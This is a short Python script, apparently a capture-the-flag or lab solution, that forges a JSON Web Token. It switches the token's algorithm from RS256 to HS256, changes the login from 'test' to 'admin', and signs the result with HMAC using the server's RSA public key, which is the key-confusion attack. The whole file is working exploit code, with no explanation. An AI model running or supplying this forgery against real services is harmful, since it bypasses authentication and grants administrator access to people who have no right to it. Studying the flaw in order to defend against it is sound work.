import base64
#7JpT48a7Y2fv

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6InRlc3QifQ.ZabKsEue5gDPyvwNnS8Xned104AR5V4LFaM4ApaLM9OvG2SEQbiiOwLvwFXM0mqAI7xoJXDosbjvNFzz21rthQDZseZkrw9Ogebbxr6b14wO6p64VQV0siBKroL_xWa8o5chkSru1kEEHAsEm5CaZvQlhshDvZc0gf-_eE0ZPudVO2j3ie_70dEqVCQJ5d86iYp5Ob0SRJdjpXNnYcmFnj9KOLnuM6TGzYExWqVRw2II2Iovjahq0IjacnnO47Hpixe8YHuTVZtzDTNLcqGvslNxYAq2efMWLktqM6rOU5k-CrtqVV3vc1bgcXmTOCI2_3FsnDQ2_hssWaocA18EEw"

header, payload, signature = token.split(".")

decoded_header = base64.decodestring(header+"==")
decoded_payload = base64.decodestring(payload+"==")

modified_header = decoded_header.replace("RS256","HS256")
encoded_header = base64.encodestring(modified_header).replace("=","")
encoded_header = encoded_header.replace("\n","")

modified_payload = decoded_payload.replace("test","admin")
encoded_payload = base64.encodestring(modified_payload).replace("=","")
encoded_payload = encoded_payload.replace("\n","")

data = encoded_header + "." + encoded_payload
f = open("public.pem")
pub = f.read()


import hmac
import hashlib 

signature = base64.urlsafe_b64encode(hmac.new(pub, data, digestmod=hashlib.sha256).digest())
print(data+"."+signature)

